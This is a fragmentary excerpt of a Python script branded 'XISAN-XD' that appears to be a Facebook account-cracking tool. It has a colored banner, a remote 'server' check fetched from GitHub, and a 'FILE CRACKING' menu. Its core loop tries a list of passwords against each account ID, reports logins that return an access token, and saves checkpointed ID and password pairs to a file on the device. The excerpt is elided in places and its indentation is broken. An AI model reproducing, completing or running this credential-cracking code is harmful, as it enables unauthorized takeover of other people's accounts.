...
BC = "\033[1;0m"
loooop = 0
#.  os.system("xdg-open https://www.github.com/Xisan-67")
os.system('clear')
def __banner___():
    print(f"""\033[1;32m
...
\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mFB         :  XISAN              
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mGITHUB     :  Xisan-67                 
...
try:
	os.system('clear')
	serv = requests.get('https://raw.githubusercontent.com/Xisan-67/SERVER/main/MAIN-SERV').text
	if "main" in serv:
		os.system('clear')
		__banner___()
...
def main():
   ...
   ## print(f"\033[1;37m[\033[1;92m1\033[1;37m] \033[1;92mFILE CRACKING ")
    ...
    if arifin in ['4','01','A','a']:
        ...
        print('\n\033[1;91m[x] Choose valid option ... ');xisan()
...
def ___mixt___(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\033[1;32m~[\033[1;92mXISAN-XD\033[1;32m]-[\033[1;32m{loop}\033[1;97m/\033[1;32m{str(len(id))}\033[1;32m]-\033[1;32m[\033[1;32mOK:{len(oks)}\033[1;32m] ');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;92m~[XISAN-OK] '+ids+' ~ '+pas+'\033[1;92m')
                ...
                break
                                ...
                                if ids in oks:pass
                                        ...
                                        #print('\r\r\033[1;30m [XISAN-CP] \033[1;30m'+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XISAN-rnd-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
            else:continue
        loop+=1
